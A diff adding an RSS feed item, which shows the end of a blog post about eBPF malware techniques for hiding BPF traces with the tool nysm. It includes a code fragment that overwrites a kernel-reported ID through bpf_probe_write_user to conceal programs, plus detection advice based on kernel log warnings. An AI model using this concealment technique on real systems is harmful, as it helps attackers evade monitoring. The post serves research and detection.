+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>uattr_ptr<span style="color:#f92672">-&gt;</span>next_id, <span style="color:#f92672">&amp;</span>id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Overwriting <em>next_id</em> Value<br><br></span>
+<h3 id="325-demo">3.2.5 Demo</h3>
+<video width=100% controls>
+    <source src="/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/videos/nysm-demo.webm" type="video/webm">
+    Your browser does not support the video tag.  
+</video>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="video"><em>nysm</em> Demo<br><br></span>
+<h2 id="4-detection">4. Detection</h2>
+<p>Even though <em>nysm</em> was very well written, warning messages for <em>bpf_probe_write_user</em> will flood the kernel logs!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo dmesg
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 8366.391364<span style="color:#f92672">]</span> nysm<span style="color:#f92672">[</span>10466<span style="color:#f92672">]</span> is installing a program with bpf_probe_write_user helper that may corrupt user memory!
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Any EDR / SIEM that monitors these logs will definitely flag this out and serve as a pivot point for Blue Teams to do their threat hunting and forensics.</p>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>By hooking into just a few strategic syscalls and keeping track of what belongs to it, <em>nysm</em> manages to fool userland tools and blend into the kernel like a ghost. This kind of behavior isn’t just useful for malware, but also shows just how powerful (and dangerous) eBPF can be when used creatively.</p>
+<p>However, there are limitations to <em>nysm&rsquo;s</em> capabilities such as the inability to suppress warning messages in the kernel logs.</p>
+<p>In the next part of the series, we will explore on some common techniques used to hide processes. In the meantime, I highly encourage you to look through the <em>nysm</em> repository source code for yourself to deepen your understanding. That&rsquo;s all folks! Till next time&hellip;</p>
+]]></content>
+        </item>
         
         <item>
             <title>eBPF Malware Techniques Part 2 - Setting Appropriate Hooks</title>
